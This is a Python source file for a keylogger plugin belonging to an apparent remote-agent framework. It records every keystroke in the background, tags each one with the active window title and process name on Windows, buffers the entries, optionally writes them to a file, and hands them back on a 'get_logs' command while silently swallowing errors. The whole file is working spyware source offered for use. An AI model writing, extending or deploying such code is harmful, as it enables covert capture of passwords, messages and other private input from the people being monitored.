"""
Keylogger Plugin for Enhanced Agent

Handles keyboard event recording with buffering, active window context capture,
and configurable buffer management.

Requirements: 3.1, 3.2, 3.3, 3.4, 3.5, 3.6
"""

import time
import threading
from typing import Dict, Any, List, Optional
from dataclasses import dataclass
from collections import deque
from remote_system.enhanced_agent.plugin_manager import Plugin

try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

try:
    import platform
    if platform.system() == "Windows":
        import win32gui
        import win32process
        WIN32_AVAILABLE = True
    else:
        WIN32_AVAILABLE = False
except ImportError:
    WIN32_AVAILABLE = False


@dataclass
class KeyEvent:
    """
    Represents a single keyboard event
    
    Attributes:
        timestamp: Time when the key was pressed
        key: The key that was pressed
        window_title: Title of the active window when key was pressed
        window_process: Process name of the active window
    """
    timestamp: float
    key: str
    window_title: str
    window_process: str


class KeyloggerPlugin(Plugin):
    """
    Keylogger Plugin
    
    Provides keyboard event recording with buffering, active window context,
    and configurable buffer management.
    
    Requirements:
    - 3.1: Begin recording keyboard events in the background
    - 3.2: Buffer keystrokes with configurable buffer size
    - 3.3: Return recorded keystrokes with timestamps
    - 3.4: Cease recording and clear buffer if requested
    - 3.5: Capture active window context for each keystroke
    - 3.6: Flush to storage or discard oldest entries on buffer overflow
    """
    
    def __init__(self):
        """Initialize the keylogger plugin"""
        self.default_buffer_size = 1000
        self.is_logging = False
        self.buffer: deque = deque(maxlen=self.default_buffer_size)
        self.listener: Optional[keyboard.Listener] = None
        self.lock = threading.Lock()
        self.overflow_action = "discard"  # "discard" or "flush"
        self.flush_file = None
    
    def execute(self, args: Dict[str, Any]) -> Any:
        """
        Execute the plugin with the given arguments
        
        Args:
            args: Dictionary containing:
                - action: 'start_logging', 'stop_logging', 'get_logs', or 'is_running'
                - Additional args based on action
                
        Returns:
            Result based on the action
            
        Raises:
            ValueError: If action is invalid or required args are missing
        """
        action = args.get('action')
        
        if action == 'start_logging':
            return self._start_logging_action(args)
        elif action == 'stop_logging':
            return self._stop_logging_action(args)
        elif action == 'get_logs':
            return self._get_logs_action(args)
        elif action == 'is_running':
            return self._is_running_action(args)
        else:
            raise ValueError(f"Invalid action: {action}")
    
    def get_name(self) -> str:
        """
        Get the name of the plugin
        
        Returns:
            The plugin name
        """
        return "keylogger"
    
    def get_required_arguments(self) -> List[str]:
        """
        Get the list of required argument names
        
        Returns:
            List of required argument names
        """
        return ['action']

    
    def start_logging(self, buffer_size: int = None, overflow_action: str = "discard",
                     flush_file: str = None) -> Dict[str, Any]:
        """
        Start recording keyboard events
        
        Args:
            buffer_size: Maximum number of keystrokes to buffer (default 1000)
            overflow_action: Action on buffer overflow - "discard" or "flush" (default "discard")
            flush_file: File path for flushing when overflow_action is "flush"
            
        Returns:
            Dictionary with success status and message
            
        Requirements: 3.1, 3.2, 3.6
        """
        if not PYNPUT_AVAILABLE:
            return {
                'success': False,
                'message': 'pynput library not available',
                'is_running': False
            }
        
        with self.lock:
            if self.is_logging:
                return {
                    'success': False,
                    'message': 'Keylogger is already running',
                    'is_running': True
                }
            
            # Set buffer size (Requirement 3.2)
            if buffer_size is not None and buffer_size > 0:
                self.buffer = deque(maxlen=buffer_size)
            else:
                self.buffer = deque(maxlen=self.default_buffer_size)
            
            # Set overflow action (Requirement 3.6)
            if overflow_action in ["discard", "flush"]:
                self.overflow_action = overflow_action
            
            if overflow_action == "flush" and flush_file:
                self.flush_file = flush_file
            
            # Start keyboard listener (Requirement 3.1)
            try:
                self.listener = keyboard.Listener(on_press=self._on_key_press)
                self.listener.start()
                self.is_logging = True
                
                return {
                    'success': True,
                    'message': 'Keylogger started successfully',
                    'is_running': True,
                    'buffer_size': self.buffer.maxlen
                }
            except Exception as e:
                return {
                    'success': False,
                    'message': f'Failed to start keylogger: {str(e)}',
                    'is_running': False
                }
    
    def stop_logging(self, clear_buffer: bool = True) -> Dict[str, Any]:
        """
        Stop recording keyboard events
        
        Args:
            clear_buffer: Whether to clear the buffer after stopping (default True)
            
        Returns:
            Dictionary with success status and message
            
        Requirement: 3.4
        """
        with self.lock:
            if not self.is_logging:
                return {
                    'success': False,
                    'message': 'Keylogger is not running',
                    'is_running': False
                }
            
            # Stop the listener
            try:
                if self.listener:
                    self.listener.stop()
                    self.listener = None
                
                self.is_logging = False
                
                # Clear buffer if requested (Requirement 3.4)
                if clear_buffer:
                    self.buffer.clear()
                
                return {
                    'success': True,
                    'message': 'Keylogger stopped successfully',
                    'is_running': False,
                    'buffer_cleared': clear_buffer
                }
            except Exception as e:
                return {
                    'success': False,
                    'message': f'Failed to stop keylogger: {str(e)}',
                    'is_running': self.is_logging
                }
    
    def get_logs(self, clear_buffer: bool = True) -> Dict[str, Any]:
        """
        Get recorded keystrokes
        
        Args:
            clear_buffer: Whether to clear the buffer after retrieving logs (default True)
            
        Returns:
            Dictionary with logs and metadata
            
        Requirement: 3.3
        """
        with self.lock:
            try:
                # Convert buffer to list of dictionaries (Requirement 3.3)
                logs = [
                    {
                        'timestamp': event.timestamp,
                        'key': event.key,
                        'window_title': event.window_title,
                        'window_process': event.window_process
                    }
                    for event in self.buffer
                ]
                
                # Clear buffer if requested
                if clear_buffer:
                    self.buffer.clear()
                
                return {
                    'success': True,
                    'logs': logs,
                    'count': len(logs),
                    'buffer_cleared': clear_buffer
                }
            except Exception as e:
                return {
                    'success': False,
                    'logs': [],
                    'count': 0,
                    'error': f'Failed to retrieve logs: {str(e)}'
                }
    
    def is_running(self) -> Dict[str, Any]:
        """
        Check if keylogger is currently running
        
        Returns:
            Dictionary with running status and buffer info
        """
        with self.lock:
            buffer_size = self.buffer.maxlen if hasattr(self.buffer, 'maxlen') and self.buffer.maxlen else 0
            return {
                'is_running': self.is_logging,
                'buffer_size': buffer_size,
                'current_count': len(self.buffer) if self.buffer else 0,
                'overflow_action': self.overflow_action
            }
    
    def _on_key_press(self, key):
        """
        Callback for keyboard events
        
        Args:
            key: The key that was pressed
            
        Requirements: 3.2, 3.5, 3.6
        """
        try:
            # Get key string representation
            try:
                key_str = key.char if hasattr(key, 'char') and key.char else str(key)
            except AttributeError:
                key_str = str(key)
            
            # Get active window context (Requirement 3.5)
            window_title, window_process = self._get_active_window()
            
            # Create key event
            event = KeyEvent(
                timestamp=time.time(),
                key=key_str,
                window_title=window_title,
                window_process=window_process
            )
            
            with self.lock:
                # Check if buffer is at capacity (Requirement 3.6)
                if len(self.buffer) >= self.buffer.maxlen:
                    if self.overflow_action == "flush" and self.flush_file:
                        # Flush oldest entry to file
                        self._flush_to_file(self.buffer[0])
                    # If "discard", deque automatically discards oldest
                
                # Add to buffer (Requirement 3.2)
                self.buffer.append(event)
        
        except Exception:
            # Silently ignore errors to prevent listener from crashing
            pass
    
    def _get_active_window(self) -> tuple:
        """
        Get the active window title and process name
        
        Returns:
            Tuple of (window_title, window_process)
            
        Requirement: 3.5
        """
        try:
            if WIN32_AVAILABLE:
                # Windows implementation
                window = win32gui.GetForegroundWindow()
                window_title = win32gui.GetWindowText(window)
                
                # Get process name
                try:
                    import psutil
                    _, pid = win32process.GetWindowThreadProcessId(window)
                    process = psutil.Process(pid)
                    window_process = process.name()
                except Exception:
                    window_process = "unknown"
                
                return window_title, window_process
            else:
                # Platform not supported or libraries not available
                return "unknown", "unknown"
        except Exception:
            return "unknown", "unknown"
    
    def _flush_to_file(self, event: KeyEvent):
        """
        Flush a key event to file
        
        Args:
            event: KeyEvent to flush
            
        Requirement: 3.6
        """
        try:
            if self.flush_file:
                with open(self.flush_file, 'a') as f:
                    f.write(f"{event.timestamp},{event.key},{event.window_title},{event.window_process}\n")
        except Exception:
            # Silently ignore flush errors
            pass
    
    def _start_logging_action(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """
        Internal method to handle start_logging action
        
        Args:
            args: Dictionary containing optional buffer_size, overflow_action, flush_file
            
        Returns:
            Dictionary with result
        """
        buffer_size = args.get('buffer_size')
        overflow_action = args.get('overflow_action', 'discard')
        flush_file = args.get('flush_file')
        
        return self.start_logging(buffer_size, overflow_action, flush_file)
    
    def _stop_logging_action(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """
        Internal method to handle stop_logging action
        
        Args:
            args: Dictionary containing optional clear_buffer
            
        Returns:
            Dictionary with result
        """
        clear_buffer = args.get('clear_buffer', True)
        
        return self.stop_logging(clear_buffer)
    
    def _get_logs_action(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """
        Internal method to handle get_logs action
        
        Args:
            args: Dictionary containing optional clear_buffer
            
        Returns:
            Dictionary with logs
        """
        clear_buffer = args.get('clear_buffer', True)
        
        return self.get_logs(clear_buffer)
    
    def _is_running_action(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """
        Internal method to handle is_running action
        
        Args:
            args: Dictionary (no additional args needed)
            
        Returns:
            Dictionary with running status
        """
        return self.is_running()
